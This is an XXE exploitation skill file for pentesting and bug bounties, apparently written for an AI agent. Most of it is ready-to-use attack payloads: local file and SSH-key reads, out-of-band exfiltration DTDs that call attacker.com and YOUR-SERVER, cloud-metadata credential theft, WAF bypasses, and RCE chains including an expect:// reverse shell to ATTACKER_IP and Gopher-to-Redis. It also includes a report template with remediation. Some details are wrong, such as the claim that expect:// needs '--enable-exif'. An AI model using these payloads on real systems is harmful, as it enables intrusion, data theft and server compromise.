---
name: vuln-xxe
description: An XXE detection and exploitation methodology engine. Triggered when testing for XML injection, interacting with XML content-types/endpoints, or processing XML-based file uploads (SVG, DOCX, SAML, SOAP). Facilitates classic file reads, blind OOB exfiltration, WAF bypasses, and SSRF chaining. Includes report structuring.
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["xxe", "xml", "ssrf", "lfi", "blind", "oob", "saml", "pentest", "web", "bug-bounty"]
---

# XXE Phantom — XML External Entity Injection

XXE occurs when an XML parser evaluates external entity declarations (`<!ENTITY xxe SYSTEM "...">`) supplied by the attacker. Impact ranges from local file disclosure to full SSRF and, in some stacks, Remote Code Execution.

---

## Phase 1 — Find the Attack Surface

### 1.1 Explicit XML Endpoints

Look for XML in request bodies or content-type headers:

```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
Content-Type: application/xhtml+xml
```

```bash
# Burp search — find requests with XML content-type
# Proxy → HTTP history → Filter → Content-Type contains "xml"

# Or grep through Burp export:
grep -rl "application/xml\|text/xml\|soap" burp_export.xml
```

### 1.2 Hidden XML — Content-Type Switching

Many JSON APIs also accept XML. Try changing `Content-Type` on any POST/PUT endpoint:

```http
# Original (JSON)
POST /api/users
Content-Type: application/json
{"username":"test"}

# Switch to XML
POST /api/users
Content-Type: application/xml
<?xml version="1.0"?>
<username>test</username>
```

If the response is the same (200, user created) — the endpoint parses XML too.

### 1.3 File Upload Vectors

These formats are ZIP-compressed XML and are parsed server-side:

| Format | Dangerous file inside ZIP |
|---|---|
| `.docx` / `.xlsx` / `.pptx` | `word/document.xml`, `xl/workbook.xml` |
| `.odt` / `.ods` | `content.xml` |
| `.svg` | The SVG file itself is XML |
| `.xsl` / `.xslt` | Stylesheet processed by XML transformer |
| `.xml` (config/import) | Any config upload feature |
| PDF (via FOP) | XSL-FO documents rendered to PDF |

### 1.4 SAML / SSO

SAML assertions are base64-encoded XML — always test:
- SSO login flows (SAMLResponse parameter)
- SP-initiated SSO (AuthnRequest)
- Single logout (LogoutRequest / LogoutResponse)

### 1.5 Other Surfaces

```
SOAP web services            → WSDL + SOAP body
WebDAV (PROPFIND)            → XML request body
RSS/Atom feed readers        → XML feed content
Excel/Calc imports           → XML-based spreadsheet
Custom XML API               → Any proprietary format
XMP metadata in images       → Embedded XML processed server-side
```

### 1.6 Confirm XML Parsing

Before injecting entities, confirm the parser echoes content back. Inject a unique canary inside an element and verify it appears in the response:

```xml
<?xml version="1.0"?>
<data><user>CANARY_1337</user></data>
```

If `CANARY_1337` appears in the response → the parser reads and reflects XML content → proceed with entity injection.

---

## Phase 2 — Classic XXE (Visible Output)

Use when the application reflects XML content in the HTTP response.

### 2.1 File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

**Windows targets:**

```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**Check if output appears** in the response body, headers, or error messages.

### 2.2 SSRF — Internal HTTP Request

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

Try internal network targets:

```xml
<!ENTITY xxe SYSTEM "http://internal-service.local/api/admin">
<!ENTITY xxe SYSTEM "http://10.0.0.1/">
<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/env">
<!ENTITY xxe SYSTEM "http://localhost:9200/">   <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://localhost:6379/">   <!-- Redis -->
```

### 2.3 Port Scanning (Time-Based)

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">     <!-- SSH — fast if open -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">   <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:5432/">   <!-- PostgreSQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:27017/">  <!-- MongoDB -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:11211/">  <!-- Memcached -->
```

Open port → fast response. Closed port → connection refused or timeout.

### 2.4 Multi-File Read via Multiple Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY f1 SYSTEM "file:///etc/passwd">
  <!ENTITY f2 SYSTEM "file:///etc/hostname">
  <!ENTITY f3 SYSTEM "file:///proc/self/environ">
]>
<root>
  <passwd>&f1;</passwd>
  <hostname>&f2;</hostname>
  <env>&f3;</env>
</root>
```

### 2.5 Error-Based File Read

When content is NOT reflected but errors ARE:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///not-exist/%file;'>">
  %eval;
  %error;
]>
<root/>
```

The parser tries to open a file path containing the contents of `/etc/passwd` → path error includes the file content.

---

## Phase 3 — Blind XXE (No Visible Output)

When the response never reflects entity content. Use Out-of-Band (OOB) exfiltration.

### 3.1 OOB via DNS — Simplest Confirmation

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR-OOB-DOMAIN.burpcollaborator.net/">
]>
<root><data>&xxe;</data></root>
```

If you get a DNS lookup or HTTP request at your OOB server → XXE confirmed, parser fetches external resources.

**OOB tools:**
- Burp Collaborator (Burp → Collaborator → Copy to clipboard)
- interactsh: `interactsh-client` → generates unique URL
- pingb.in, canarytokens.org (passive)

### 3.2 OOB File Exfiltration via External DTD

**Step 1** — Host a malicious DTD on your server (`evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

**Step 2** — Inject a parameter entity that fetches your DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<root/>
```

**Step 3** — Your server receives: `GET /?data=root:x:0:0:root:/root:/bin/bash...`

**Host the DTD:**

```bash
# Python HTTP server
python3 -m http.server 80

# Or with ngrok for public URL
ngrok http 80
```

### 3.3 OOB via FTP (bypass HTTP-only egress filters)

Some servers allow FTP but block HTTP. Host a simple FTP server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'ftp://YOUR-SERVER:2121/%file;'>">
%wrap;
%send;
```

```bash
# Simple FTP server for capture (Python)
python3 scripts/xxe_probe.py --ftp-server --port 2121
```

### 3.4 Multi-Line File Read (Handle Newlines)

The basic approach breaks on newlines. Use PHP or Java wrappers to base64-encode first:

```xml
<!-- PHP wrapper — base64 encodes the file, no newline issues -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

Then decode:

```bash
echo "cm9vdDp4OjA..." | base64 -d
```

**Java alternative (when PHP is not available):**

```xml
<!-- Netdoc protocol — Java-specific, handles newlines better -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### 3.5 Error-Based Blind XXE (No HTTP Egress)

When the server has no outbound internet access but does produce error messages:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root/>
```

Parser error: `file not found: /nonexistent/root:x:0:0:root:/root:/bin/bash...` — the file content appears inside the error message.

---

## Phase 4 — XXE via File Uploads

### 4.1 SVG Upload

SVG is XML. If the server renders SVG (thumbnail, preview, display), it may parse entities:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
```

Upload as `.svg`, then view the rendered image or the server response.

**Blind SVG (OOB):**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

### 4.2 DOCX / XLSX / PPTX (Office Open XML)

These are ZIP archives. Inject into the embedded XML:

```bash
# 1. Create a legitimate docx/xlsx
# 2. Unzip it
unzip legitimate.docx -d docx_extracted/

# 3. Edit word/document.xml (for .docx) or xl/workbook.xml (for .xlsx)
# Add at the top, after the XML declaration:
nano docx_extracted/word/document.xml
```

Add the XXE payload at the beginning of the XML file:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
```

```bash
# 4. Repack
cd docx_extracted && zip -r ../malicious.docx . && cd ..

# 5. Upload malicious.docx via the target's document import/upload feature
```

### 4.3 ODT / ODS (LibreOffice / OpenDocument)

```bash
unzip legitimate.odt -d odt_extracted/
# Edit content.xml — inject DOCTYPE before root element
nano odt_extracted/content.xml
# Repack
cd odt_extracted && zip -r ../malicious.odt . && cd ..
```

### 4.4 XSL / XSLT Injection

XSLT stylesheets support `document()` and `xsl:include` which fetch external resources:

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <!-- Read local file via document() -->
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<!-- SSRF via document() -->
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
```

---

## Phase 5 — XXE via XInclude

XInclude works **without controlling the DOCTYPE** — perfect for when the app wraps your input inside its own XML document.

```xml
<!-- Inject into any XML field / attribute value -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

```xml
<!-- SSRF via XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

**When to use XInclude:** the application constructs XML on the server-side and embeds user input inside it. You cannot inject a `DOCTYPE` because the parser receives a full document, but XInclude directives in element content are still processed.

---

## Phase 6 — SAML XXE

SAML assertions are base64-encoded XML sent in `SAMLResponse` parameters.

### 6.1 Intercept a SAML Flow

```bash
# Burp Suite → Proxy → intercept SAMLResponse parameter
# Decode the base64 value:
echo "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..." | base64 -d | xmllint --format -
```

### 6.2 Inject XXE into the SAML Assertion

After decoding, find the `<samlp:Response>` root element and prepend a DOCTYPE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  <!-- original assertion content -->
</samlp:Response>
```

### 6.3 Re-encode and Send

```bash
# Re-encode and URL-encode for POST
python3 -c "
import base64, urllib.parse, sys
with open('modified_saml.xml','rb') as f:
    data = f.read()
encoded = base64.b64encode(data).decode()
print(urllib.parse.quote(encoded))
" > encoded_payload.txt

# Paste into SAMLResponse= parameter in Burp Repeater
```

**Note:** SAML signatures protect the assertion content. However:
- If the SP doesn't validate the signature → inject directly
- If only the `<Assertion>` element is signed → inject in the `<Response>` wrapper outside it
- If the XML parser processes entities before signature validation → works regardless

---

## Phase 7 — Protocol Handlers

Different protocols work depending on the XML parser and server platform:

| Protocol | Usage | Platform |
|---|---|---|
| `file://` | Local file read | All |
| `http://` / `https://` | SSRF | All (if network egress allowed) |
| `ftp://` | OOB exfiltration, bypasses HTTP filters | All |
| `php://filter/...` | Base64-encoded file read (no newlines) | PHP |
| `php://input` | Read request body | PHP |
| `expect://id` | RCE (requires expect:// wrapper enabled) | PHP (rare) |
| `netdoc://` | File read — handles newlines | Java |
| `jar://` | Multi-step: fetch JAR, read file inside | Java |
| `gopher://` | SSRF to TCP services (Gopher protocol) | Java/Python |

### PHP expect:// RCE (when enabled)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root><data>&xxe;</data></root>
```

Only works if PHP was compiled with `--enable-exif` or `expect` extension is loaded (uncommon).

### Gopher:// — SSRF to Internal TCP Services

```xml
<!-- Send a Redis command via XXE → SSRF → Gopher → Redis -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">
```

Build Gopher payloads for internal services using tools like Gopherus.

---

## Phase 8 — WAF and Filter Bypass Techniques

### 8.1 Encoding the XML Declaration

```xml
<!-- UTF-16 encoding — some WAFs don't decode before inspection -->
<!-- Generate: python3 -c "open('payload.xml','wb').write(open('payload_utf8.xml').read().encode('utf-16'))" -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

```xml
<!-- UTF-7 (older parsers) -->
<?xml version="1.0" encoding="UTF-7"?>
```

### 8.2 Chunked Transfer Encoding

Split the payload across chunks so WAF pattern matching fails:

```http
POST /api/data HTTP/1.1
Content-Type: application/xml
Transfer-Encoding: chunked

1a
<?xml version="1.0"?>
1c
<!DOCTYPE root [<!ENTITY
1e
xxe SYSTEM "file:///etc/passwd
3
">]>
e
<root>&xxe;</root>
0

```

### 8.3 Alternate DOCTYPE Syntax

```xml
<!-- Multiline / indented -->
<!
DOCTYPE
root
[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- Comments inside DOCTYPE -->
<!DOCTYPE root [<!--comment--><!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- No space before SYSTEM -->
<!ENTITY xxe SYSTEM"file:///etc/passwd">

<!-- PUBLIC instead of SYSTEM (some parsers) -->
<!ENTITY xxe PUBLIC "-//test//" "file:///etc/passwd">
```

### 8.4 CDATA Wrapper (bypass content-type filters)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[<data>]]>&xxe;<![CDATA[</data>]]></root>
```

### 8.5 Nested Parameter Entities

Obfuscate the payload through multiple levels of entity expansion:

```xml
<!DOCTYPE root [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://YOUR-SERVER/evil.dtd'>">
  %a;
  %b;
]>
```

### 8.6 Double URL Encoding in Entity Value

```xml
<!-- When the URL in SYSTEM is decoded by WAF before inspection -->
<!ENTITY xxe SYSTEM "file%3A%2F%2F%2Fetc%2Fpasswd">
<!ENTITY xxe SYSTEM "file%253A%252F%252F%252Fetc%252Fpasswd">
```

---

## Phase 9 — Escalation Chains

### 9.1 XXE → SSRF → Cloud Metadata (AWS / GCP / Azure)

```xml
<!-- AWS IMDSv1 — retrieve IAM credentials -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- Step 2: get the role name from the response, then -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- Note: GCP requires Metadata-Flavor: Google header — may not work via XXE unless the parser forwards custom headers -->

<!-- Azure IMDS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
```

### 9.2 XXE → LFI → SSH Private Key

```xml
<!ENTITY xxe SYSTEM "file:///home/www-data/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/ubuntu/.ssh/id_rsa">
```

Once you have the private key → SSH into the server.

### 9.3 XXE → LFI → Source Code → Credentials

```xml
<!-- Application source code -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///app/config/database.yml">
<!ENTITY xxe SYSTEM "file:///app/.env">
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">

<!-- Application secrets -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///etc/environment">
```

### 9.4 XXE → SSRF → Internal Admin Panels

```xml
<!-- Spring Boot Actuator (unauthenticated in older versions) -->
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/env">
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/heapdump">

<!-- Jenkins -->
<!ENTITY xxe SYSTEM "http://localhost:8080/script">

<!-- Kubernetes API -->
<!ENTITY xxe SYSTEM "http://localhost:10250/pods">
<!ENTITY xxe SYSTEM "https://kubernetes.default.svc/api/v1/secrets">

<!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://localhost:9200/_cat/indices">
<!ENTITY xxe SYSTEM "http://localhost:9200/_all/_search">
```

### 9.5 XXE → RCE (PHP expect://)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'">
]>
<root><data>&xxe;</data></root>
```

### 9.6 XXE → Gopher → Redis → RCE (Server-Side)

```bash
# Generate Gopher payload for Redis (using Gopherus)
python2 gopherus.py --exploit redis
# → generates gopher:// URL for writing cron job or PHP webshell
```

```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/GENERATED_GOPHERUS_PAYLOAD">
```

---

## Phase 10 — Automated Testing

### Burp Suite Workflow

1. **Intercept XML requests:** Proxy → HTTP history → filter Content-Type contains "xml"
2. **Send to Repeater** — manually inject the basic entity payload (Phase 2.1)
3. **Use Burp Collaborator** for blind OOB detection (Phase 3.1)
4. **Active Scan** — Burp Pro's scanner detects XXE automatically if pointed at XML endpoints
5. **BApp: Content Type Converter** — automatically retries requests with XML content-type
6. **BApp: Upload Scanner** — tests XXE in file upload fields (SVG, DOCX, etc.)

### XXEinjector (automation)

```bash
gem install xxeinjector  # or clone from GitHub

# Basic file read (visible output)
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http

# Blind OOB mode
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http --phpfilter

# Enumerate files in directory
ruby XXEinjector.rb --host=YOUR-SERVER --path=/var/www/ --file=request.txt --oob=http --enumerate

# request.txt format: the raw HTTP request with XXEINJECT marker where payload goes
```

### Script: `scripts/xxe_probe.py`

```bash
# Test single endpoint with visible output
python3 scripts/xxe_probe.py -u https://target.com/api/xml -f /etc/passwd

# Test with OOB server
python3 scripts/xxe_probe.py -u https://target.com/api/xml --oob http://YOUR-SERVER/ --file /etc/passwd

# Test file upload for XXE (SVG)
python3 scripts/xxe_probe.py -u https://target.com/upload --upload --format svg --oob http://YOUR-SERVER/

# Run FTP exfil server locally
python3 scripts/xxe_probe.py --ftp-server --port 2121
```

---

## Phase 11 — Confirm the Finding

- [ ] DOCTYPE injection accepted (no parser error, no 400 response)
- [ ] Entity value reflected in response (classic) OR OOB callback received (blind)
- [ ] File contents confirmed — at minimum first line of `/etc/passwd` showing `root:x:0:0:`
- [ ] Reproducible from a clean session without prior state
- [ ] SSRF confirmed if applicable — internal resource response or OOB DNS for internal host

**False positive checks:**
- Server returns 400 "DOCTYPE not allowed" → parser hardened, not vulnerable
- Entity syntax in response literally (`&xxe;` or `SYSTEM "..."`) → parser escaped rather than evaluated
- `CANARY_1337` reflects but `&xxe;` doesn't → reflection exists but entity expansion disabled (partial protection)
- OOB callback comes from YOUR machine, not the target → local test environment issue

---

## Phase 12 — Report Structure

```
Title: XXE Injection on [endpoint] — [Impact: Local File Read / SSRF / Blind OOB]

Severity:
  Critical: RCE via expect://, SSRF to cloud metadata with credential theft, SSH key read
  High:     Local file read (passwd, source code, .env), SSRF to internal services
  Medium:   SSRF to non-sensitive internal URLs, blind XXE confirmed but limited impact
  Low:      XXE confirmed but no external HTTP/file access allowed

CWE: CWE-611 — Improper Restriction of XML External Entity Reference
OWASP: A05:2021 – Security Misconfiguration

CVSS 3.1 Base (file read):
  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 (Medium)
CVSS 3.1 Base (SSRF → internal admin, no auth):
  AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 (Critical)

Affected endpoint: POST https://target.com/api/xml
Content-Type: application/xml

Steps to reproduce:
1. Send the following request:
   POST /api/xml HTTP/1.1
   Host: target.com
   Content-Type: application/xml

   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root><name>&xxe;</name></root>

2. Observe: response body contains contents of /etc/passwd:
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   [...]

For Blind XXE:
1. Host evil.dtd at http://YOUR-SERVER/evil.dtd with content:
   [paste DTD]
2. Send request with: <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd"> %remote;
3. Observe OOB server receiving: GET /?data=root:x:0:0:root:...

Impact:
- [File read] Attacker can read arbitrary files accessible to the web server process
- [SSRF] Attacker can probe and interact with internal services not exposed to the internet
- [Credential theft] Application secrets, database passwords, and API keys exposed
- [Escalation] SSH private key read → server compromise / lateral movement

Evidence:
- HTTP request/response screenshot showing entity content in response
- OOB server log showing file content received (for blind)
- Screenshot of /etc/passwd contents in response

Remediation:
- Disable external entity processing in the XML parser (language-specific):

  Java (SAXParser):
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

  Python (lxml):
    parser = etree.XMLParser(resolve_entities=False, no_network=True)

  PHP (libxml):
    libxml_disable_entity_loader(true);   # PHP < 8.0
    # PHP 8.0+: entity loading disabled by default

  .NET:
    XmlReaderSettings settings = new XmlReaderSettings();
    settings.DtdProcessing = DtdProcessing.Prohibit;

  Node.js (libxmljs):
    libxmljs.parseXml(xml, { noent: false, dtdload: false, dtdvalid: false });

- Use a whitelist-based XML schema (XSD) to validate structure before parsing
- Reject requests with DOCTYPE declarations at the application layer
- Run the XML parser in a sandboxed environment with no network/filesystem access
- Prefer JSON over XML where XML functionality is not required
```

---

## Quick-Reference: Priority Attack Order

1. **Inject basic `file:///etc/passwd`** — confirm if reflection is visible
2. **OOB DNS check** — send entity to Collaborator URL — confirm parser makes outbound requests
3. **External DTD for blind exfil** — host `evil.dtd`, exfiltrate file contents via OOB
4. **PHP filter wrapper** — `php://filter/convert.base64-encode` for multi-line files without newline issues
5. **SSRF → cloud metadata** — `http://169.254.169.254/...` for IAM credential theft
6. **File upload XXE** — SVG → DOCX → ODT if REST endpoints are hardened
7. **XInclude** — when DOCTYPE is blocked but XML element content is user-controlled
8. **SAML** — intercept SAMLResponse, inject outside signed assertion

---

## Reference Files

- `references/payloads.md` — ready-to-use payload library (classic, blind, XInclude, SAML, XSLT, bypass)
- `references/file-targets.md` — high-value files to read per OS/framework/language
- `references/tools.md` — XXEinjector, Burp workflow, OOB servers, Gopherus
- `scripts/xxe_probe.py` — automated XXE tester with OOB detection and FTP exfil server


---

## From hack-skills: Advanced XXE Techniques

### OOB XXE via Attacker-Hosted DTD

When external entities are allowed but response doesn't reflect content, use OOB:

```xml
<!-- Step 1: Host evil.dtd on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;

<!-- Step 2: Inject into XML body: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<foo>&xxe;</foo>
```

### Error-Based OOB (via Non-Existent File Path)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%oob;
%error;
<!-- Error message reveals file contents: "java.io.FileNotFoundException: /nonexistent/root:x:0:0..." -->
```

### SVG XXE

Upload SVG with embedded XXE when image preview reflects content:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text y="16">&xxe;</text>
</svg>
```

### OOXML (docx/xlsx/pptx) XXE

```bash
# Unzip the Office file:
unzip document.docx -d docx_extracted/

# Edit word/document.xml to inject XXE:
# Add before <w:document> tag:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then reference &xxe; inside the document body

# Rezip:
cd docx_extracted && zip -r ../evil.docx .
```

### SOAP XXE

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soapenv:Body>
    <foo>&xxe;</foo>
  </soapenv:Body>
</soapenv:Envelope>
```

### XInclude Attack (no DTD control needed)

When you can't modify DOCTYPE but control an XML value processed by the parser:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

### Local DTD Injection (Blocked External Entities)

When external DTD is blocked but internal doctype is allowed, use a local DTD file to redefine an entity:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;http://attacker.com/?d=&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;exfil;
  '>
  %local_dtd;
]>
```

**Common local DTD paths (Linux):**
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/etc/xml/catalog
/usr/share/doc/xml-core/schema/
```

**Common local DTD paths (Windows):**
```
C:\Windows\System32\drivers\etc\hosts
C:\Program Files\Common Files\Microsoft Shared\...
```

### FTP-Based Line-by-Line Exfiltration

For files with newlines (FTP protocol strips newlines allowing one-line-at-a-time exfil):
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
  %exfil; %send;
]>
```

Run a rogue FTP server: `python3 -m pyftpdlib -p 2121` — each line of the file arrives as a separate FTP command.

### SAML XXE

SAML requests/responses are base64-encoded XML. Inject XXE into the decoded XML:
```bash
# Decode the SAMLResponse:
echo "BASE64_SAML" | base64 -d > saml.xml

# Edit saml.xml: add XXE DOCTYPE declaration
# Re-encode:
base64 -w0 saml.xml > saml_encoded.txt

# Send the modified base64 value in the SAMLResponse parameter
```

### XSLT Injection → XXE Connection

XSLT processors often support XXE. Xalan-J (Java):
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>
  </xsl:template>
</xsl:stylesheet>
```


---

## hunt-xxe — Hunting Methodology (real BB reports)

## Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

## Attack Surface Signals

### URL Patterns
```
/api/v*/xml
/upload
/import
/parse
/convert
/saml/acs
/sso/saml
/feed
/rss
/sitemap
/webdav
/soap/*
/wsdl
/service.asmx
/xmlrpc
/graphql (multipart with XML)
```

### Request/Response Headers
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← check file upload fields
Accept: application/xml
X-Content-Type-Options: (absent — good sign of loose parsing)
```

### JavaScript Patterns (source recon)
```javascript
// Look for in JS bundles
XMLSerializer
DOMParser
parseFromString
new ActiveXObject("Microsoft.XMLDOM")
$.parseXML(
xml2js
libxmljs
lxml
```

### Tech Stack Signals
- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
